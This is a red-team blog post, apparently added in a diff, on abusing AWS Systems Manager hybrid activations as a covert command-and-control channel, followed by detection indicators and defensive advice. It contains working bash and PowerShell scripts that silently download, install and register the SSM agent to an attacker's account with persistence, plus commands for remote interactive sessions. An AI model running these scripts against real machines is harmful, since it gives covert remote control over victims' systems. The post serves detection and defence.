@@ -1,0 +1,285 @@
+---
+title: "Abusing AWS Systems Manager as a Covert C2 Channel"
+description: "How AWS SSM hybrid activations can be weaponized as a stealthy Living-off-the-Cloud C2 platform on non-EC2 machines — and how to detect it."
+pubDate: 2026-05-20
+tags: ["aws", "ssm", "c2", "red-team", "living-off-the-cloud", "detection"]
+categories: ["Red Team Ops"]
+---
+
+import { Image } from 'astro:assets';
+
+import hybridActivationSetup from '../../../assets/images/posts/abusing-aws-ssm-c2/01-hybrid-activation-setup.png';
+import hybridActivationCreds from '../../../assets/images/posts/abusing-aws-ssm-c2/02-hybrid-activation-creds.png';
+import macRegistration from '../../../assets/images/posts/abusing-aws-ssm-c2/03-mac-registration.png';
+import macSsmOnline from '../../../assets/images/posts/abusing-aws-ssm-c2/03b-mac-ssm-online.png';
+import macRunShell from '../../../assets/images/posts/abusing-aws-ssm-c2/04-mac-run-shell-script.png';
+import macScriptOutput from '../../../assets/images/posts/abusing-aws-ssm-c2/05-mac-script-output.png';
+import macSessionStart from '../../../assets/images/posts/abusing-aws-ssm-c2/06-mac-session-start.png';
+import macActiveSession from '../../../assets/images/posts/abusing-aws-ssm-c2/07-mac-active-session.png';
+import winTarget from '../../../assets/images/posts/abusing-aws-ssm-c2/08-win-target.jpeg';
+import winRegistration from '../../../assets/images/posts/abusing-aws-ssm-c2/09-win-registration.png';
+import winPerfMetrics from '../../../assets/images/posts/abusing-aws-ssm-c2/10-win-perf-metrics.png';
+import winProcessEnum from '../../../assets/images/posts/abusing-aws-ssm-c2/11-win-process-enum.png';
+import winSessionStart from '../../../assets/images/posts/abusing-aws-ssm-c2/12-win-session-start.png';
+import winWhoami from '../../../assets/images/posts/abusing-aws-ssm-c2/13-win-whoami.png';
+
+> **TL;DR** — AWS Systems Manager (SSM) can be weaponized as a stealthy command-and-control channel on non-EC2 machines using hybrid activations. All traffic flows over trusted `*.amazonaws.com` endpoints using AWS-signed binaries, making it highly effective at evading endpoint and network controls.
+
+---
+
+## What is AWS Systems Manager?
+
+AWS Systems Manager (SSM) is a legitimate AWS service used by cloud teams to manage fleets of EC2 instances — running remote commands, collecting inventory, patching, and more. What makes it interesting from an offensive perspective is its **hybrid activation** feature, which allows *non-AWS machines* (on-prem servers, laptops, VMs) to register with SSM and be managed like any EC2 instance.
+
+This is exactly the capability we abuse.
+
+---
+
+## The Attack: Living Off The Cloud
+
+The core idea is simple: register the victim machine with an attacker-controlled AWS account via a hybrid activation. From that point, the attacker has full interactive shell access, can run arbitrary commands, browse the file system, and exfiltrate data — all over HTTPS to `*.amazonaws.com`.
+
+No custom binaries, no C2 infrastructure to stand up. The payload is the **official Amazon-signed SSM Agent**.
+
+### Why This is Effective
+
+| Factor | Detail |
+|---|---|
+| **Signed binaries** | AWS-signed executables bypass most code-signing enforcement |
+| **Trusted network traffic** | SSM traffic to `amazonaws.com` blends into normal cloud API calls |
+| **No inbound ports** | Agent polls outbound — no listener, no exposed port |
+| **Legitimate AWS service** | Many orgs allowlist AWS endpoints at the firewall/proxy level |
+| **Documented "limitation"** | AWS docs understate OS support — it works far more broadly |
+
+---
+
+## Phase 1: Attacker Setup — Creating a Hybrid Activation
+
+In the attacker-controlled AWS account, navigate to **AWS Systems Manager → Fleet Manager → Hybrid Activations** and create a new activation.
+
+<Image src={hybridActivationSetup} alt="AWS SSM console — creating a hybrid activation for non-EC2 managed nodes" />
+
+Once created, the console displays the activation credentials:
+
+<Image src={hybridActivationCreds} alt="AWS SSM hybrid activation — Activation ID and Activation Code" />
+
+```
+Activation ID:   xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+Activation Code: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+Keep the AWS region handy (e.g. `us-east-1`). These two values are all you need to register any machine.
+
+---
+
+## Phase 2: Deploying the Agent
+
+### macOS
+
+A bash script downloads the official SSM Agent pkg directly from Amazon S3 and installs it with launchd persistence:
+
+```bash
+#!/bin/bash
+
+ACTIVATION_CODE="YOUR_ACTIVATION_CODE"
+ACTIVATION_ID="YOUR_ACTIVATION_ID"
+REGION="us-east-1"
+
+# Download official Amazon-signed SSM Agent
+curl -o /tmp/amazon-ssm-agent.pkg \
+  https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/darwin_arm64/amazon-ssm-agent.pkg
+
+# Install silently
+sudo installer -pkg /tmp/amazon-ssm-agent.pkg -target /
+
+# Register with the attacker's AWS account via hybrid activation
+sudo amazon-ssm-agent -register -code "$ACTIVATION_CODE" \
+  -id "$ACTIVATION_ID" -region "$REGION"
+
+# Start and persist via launchd
+sudo launchctl load /Library/LaunchDaemons/com.amazon.aws.ssm.plist
+```
+
+The script runs silently on the victim Mac:
+
+<Image src={macRegistration} alt="SSM agent installation and registration script executing on the victim macOS machine" />
+
+Within seconds the Mac appears as **online** in Fleet Manager — despite AWS docs claiming macOS is unsupported for hybrid activation:
+
+<Image src={macSsmOnline} alt="Victim Mac registered and showing as online in the attacker's SSM Fleet Manager console" />
+
+---
+
+### Windows
+
+A PowerShell script downloads and installs the agent as a persistent auto-start Windows service:
+
+```powershell
+$ActivationCode = "YOUR_ACTIVATION_CODE"
+$ActivationId   = "YOUR_ACTIVATION_ID"
+$Region         = "us-east-1"
+
+# Download official Amazon-signed installer
+Invoke-WebRequest `
+  -Uri "https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/windows_amd64/AmazonSSMAgentSetup.exe" `
+  -OutFile "$env:TEMP\AmazonSSMAgentSetup.exe"
+
+# Silent install
+Start-Process -FilePath "$env:TEMP\AmazonSSMAgentSetup.exe" `
+  -ArgumentList "/S" -Wait
+
+# Register with attacker's AWS account
+& "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe" `
+  -register -code $ActivationCode -id $ActivationId -region $Region
+
+# Start the service (auto-start is set by the installer)
+Start-Service AmazonSSMAgent
+```
+
+The Windows 10 machine registers successfully:
+
+<Image src={winTarget} alt="Windows 10 Pro machine registered to the attacker's AWS SSM account" />
+
+SSM agent communication confirmed — the Windows host is now fully managed:
+
+<Image src={winRegistration} alt="SSM agent on Windows communicating back to AWS — machine showing online in Fleet Manager" />
+
+---
+
+## Phase 3: Command & Control
+
+Once the machine appears in **Fleet Manager**, the full SSM feature set is available.
+
+### macOS — Running Commands
+
+Using the built-in `AWS-RunShellScript` document to execute arbitrary shell commands without touching disk:
+
+<Image src={macRunShell} alt="AWS-RunShellScript document being used to execute commands on the victim macOS machine" />
+
+Output returned directly in the SSM console:
+
+<Image src={macScriptOutput} alt="Shell script command output returned in the AWS SSM console from the victim Mac" />
+
+### macOS — Interactive Terminal Session
+
+```bash
+aws ssm start-session --target mi-0123456789abcdef0 --region us-east-1
+```
+
+<Image src={macSessionStart} alt="Initiating an SSM Session Manager interactive terminal session on the victim macOS machine" />
+
+Full interactive shell — no SSH, no open ports, all traffic over `ssmmessages.amazonaws.com`:
+
+<Image src={macActiveSession} alt="Active interactive terminal session running on the victim macOS machine via SSM Session Manager" />
+
+### Windows — Real-Time Visibility
+
+SSM provides live performance metrics on the compromised Windows host directly in the console:
+
+<Image src={winPerfMetrics} alt="Real-time CPU and memory performance metrics for the compromised Windows machine in SSM Fleet Manager" />
+
+Process enumeration without any tooling on the target:
+
+<Image src={winProcessEnum} alt="Process enumeration on the Windows victim via SSM Fleet Manager — no tools required on target" />
+
+### Windows — Interactive Terminal Session
+
+<Image src={winSessionStart} alt="Starting an SSM Session Manager terminal session on the Windows victim" />
+
+Full command execution confirmed:
+
+<Image src={winWhoami} alt="whoami output confirming command execution on the victim Windows machine via SSM interactive session" />
+
+### Built-in Capabilities via SSM Documents
+
+| SSM Document | What it does |
+|---|---|
+| `AWS-RunShellScript` | Execute arbitrary shell commands (macOS/Linux) |
+| `AWS-RunPowerShellScript` | Execute PowerShell (Windows) |
+| `AWS-GatherSoftwareInventory` | Enumerate installed software |
+| `AWS-ListWindowsInventory` | Windows process / service enumeration |
+| `AWS-ConfigureAWSPackage` | Install packages on the target |
+
+Everything flows outbound over HTTPS to `ssm.<region>.amazonaws.com` — indistinguishable from normal cloud API traffic.
+
+---
+
+## Detection
+
+### macOS Indicators of Compromise
+
+```
+# LaunchDaemon persistence
+/Library/LaunchDaemons/com.amazon.aws.ssm.plist
+
+# SSM Agent binary
+/usr/local/bin/amazon-ssm-agent
+
+# Config directory
+/etc/amazon/ssm/
+
+# Network connections
+ssm.*.amazonaws.com
+ec2messages.*.amazonaws.com
+ssmmessages.*.amazonaws.com
+
+# S3 download artefact
+curl/wget to: s3.amazonaws.com/ec2-downloads-windows/SSMAgent/
+```
+
+> [!WARNING]
+> The LaunchDaemon path and the S3 download URL are reliable high-fidelity IOCs. Alert on SSM pkg installs from Amazon S3 paths on endpoints not enrolled in your SSM management account.
+
+### Windows Indicators of Compromise
+
+```
+# Service creation
+AmazonSSMAgent (ImagePath: C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe)
+
+# Registry key
+HKLM\SYSTEM\CurrentControlSet\Services\AmazonSSMAgent
+
+# PowerShell download
+Invoke-WebRequest → AmazonSSMAgentSetup.exe from s3.amazonaws.com SSM paths
+
+# Suspicious parent-child process
+amazon-ssm-agent.exe → cmd.exe / powershell.exe
+
+# Event log
+Event ID 7045 — new service installed
+```
+
+> [!WARNING]
+> `AmazonSSMAgent` appearing as a new service on a machine **not** in your AWS management account is a strong signal. Monitor Event ID 7045 and cross-reference against your known managed instance inventory.
+
+### Network Detection
+
+Monitor for outbound HTTPS connections to these endpoints from unexpected hosts:
+
+```
+ssm.<region>.amazonaws.com
+ssmmessages.<region>.amazonaws.com
+ec2messages.<region>.amazonaws.com
+```
+
+Any host reaching these that isn't in your Fleet Manager inventory warrants immediate investigation.
+
+### Defensive Recommendations
+
+- **Allow** AWS SSM agent only when deployed via approved MDM/configuration management channels — use context-aware allowlisting, not just signature checks
+- **Alert** on SSM agent installation outside your change management window
+- **Restrict** `ssm:CreateActivation` IAM permissions — this is the attacker's entry point into your AWS account
+- **Audit** hybrid activations in your own AWS accounts regularly for unexpected registrations
+- **Block** outbound access to `ssm.*.amazonaws.com` on hosts that should not be SSM-managed
+
+---
+
+## Key Takeaway
+
+This is a textbook **Living Off The Cloud** technique. No custom malware, no suspicious binaries, no C2 infrastructure to stand up. The entire attack chain uses official Amazon software talking to Amazon infrastructure.
+
+The implication for defenders: **cloud service abuse is the new LOLBins**. Your detections need context — not just *what* is running, but *which AWS account* it's talking to.
+
+---
+
+*All techniques described here were demonstrated in isolated lab environments. Nothing was tested against systems without explicit authorisation.*
